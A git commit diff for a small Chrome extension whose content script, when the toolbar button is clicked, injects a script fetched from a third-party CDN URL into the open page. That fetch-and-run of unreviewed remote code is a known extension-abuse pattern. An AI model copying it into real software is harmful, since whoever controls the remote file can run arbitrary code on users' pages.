ed93223cf3fade1ad6fa220a1e81f2ed06f92a90
Roottr <mustafabozkurt@gmx.com>
2018-11-09 20:04:56 +0100

    First Release

---
+++ background.js
@@ -0,0 +1,9 @@
+chrome.browserAction.onClicked.addListener(buttonClicked);
+
+function buttonClicked(tab) {
+
+    let msg = {
+        text: "hello"
+    }
+    chrome.tabs.sendMessage(tab.id, msg);
+}
---
+++ content.js
@@ -0,0 +1,24 @@
+chrome.runtime.onMessage.addListener(gotMessage);
+
+function gotMessage(message, sender, sendResponse) {
+
+    console.log('Chrome extension go?');
+
+
+    let random_version = Math.floor((Math.random() * 10) + 1);
+
+    function loadScript(url, callback) {
+
+        const head = document.getElementsByTagName('head')[0];
+        const script = document.createElement('script');
+        script.type = 'text/javascript';
+        script.src = url;
+        script.onreadystatechange = callback;
+        script.onload = callback;
+        head.appendChild(script);
+
+    }
+    loadScript("https://min.gitcdn.link/repo/roottr/norm/Master/app.js?version=" + random_version, "callback");
+
+
+}
